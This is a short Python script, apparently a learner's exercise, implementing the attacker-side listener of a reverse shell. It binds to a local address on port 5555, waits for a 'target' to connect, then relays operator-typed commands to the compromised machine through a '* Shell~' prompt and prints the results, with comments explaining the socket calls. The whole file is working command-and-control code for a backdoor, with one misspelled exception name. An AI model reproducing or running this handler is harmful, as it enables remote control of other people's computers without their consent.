import socket
import json

def reliable_send(data):
	jsondata = json.dumps(data)
	target.send(jsondata.encode())

def reliable_recv():
	data= ''
	while True:
		try:
			data = data + target.recv(1024).decode().rstrip()
			return json.loads(data)
		except valueError:
			continue


def target_communication():
	while True:
		command = input('* Shell~%s: ' %str(ip))
		reliable_send(command)
		if command =='quit':
			break
		else:
			result = reliable_recv()
			print(result)


#socket.AF_INET means we making connections on ipv4 address
#socket.SOCK_STREAM means  that we are going to use tcp connections
#sock.listen(5) means we are listening for 5 diffrent connections
#target_communication are send command to the target and receive information
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('192.168.1.43', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
target_communication()
